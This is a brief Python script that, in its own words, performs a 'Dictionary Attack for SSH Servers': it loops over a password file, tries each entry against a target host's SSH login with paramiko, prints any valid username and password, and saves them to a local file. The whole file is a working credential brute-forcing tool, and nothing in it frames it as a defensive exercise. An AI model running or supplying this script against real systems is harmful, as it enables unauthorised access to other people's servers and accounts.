import paramiko
import socket

def check_conn (target, username, password):
    # init
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=target, username=username, password=password, timeout=2)
    except socket.timeout:
        print(f'Host: {target} is unreachable, SSH enabled?')
        return False
    except paramiko.AuthenticationException:
        print(f'Invalid credenitals for {username}:{password}')
        return False
    except paramiko.SSHException:
        print(f'Exveption occured')
        return False
    else:
        print(f'Valid credentials:\n\tHOSTNAME: {target}\n\tUSERNAME: {username}\n\tPASSWORD: {password}')
        return True

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Diectionary Attack for SSH Servers")
    parser.add_argument("target", help="Target machine")
    parser.add_argument("-p", "--passwords", help="Password file")
    parser.add_argument("-u", "--username", help="SSH Usernam")

    #parse args
    args = parser.parse_args()
    target = args.target
    passes = args.passwords
    user = args.username
    passes = open(passes).read().splitlines()

    for password in passes:
        if check_conn(target, user, password):
            open("ValidCreds.txt", "w").write(f'\nUsername: {user}@{target}\nPassword: {password}\n\n')